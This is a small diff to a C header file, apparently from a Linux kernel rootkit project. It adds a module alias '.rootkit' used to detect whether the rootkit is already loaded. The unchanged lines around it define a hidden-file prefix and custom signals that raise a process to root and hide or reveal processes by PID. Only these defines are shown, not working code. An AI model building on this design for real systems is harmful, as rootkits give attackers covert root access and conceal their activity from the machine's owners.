@@ -8,6 +8,8 @@
 #define HIDDEN_PREFIX_LEN (sizeof(__HIDDEN_PREFIX) - 1) /* Length of the prefix */
 extern const char S_HIDDEN_PREFIX[];                    // Prefix for hidden files/directories
 
+#define MOD_ALIAS ".rootkit" /* Module alias (to check if rootkit is already loaded) */
+
 #define SIGROOT 42 /* Elevate the current process to root */
 #define SIGHIDE 43 /* Hide the process with the given PID */
 #define SIGSHOW 44 /* Show the process with the given PID */
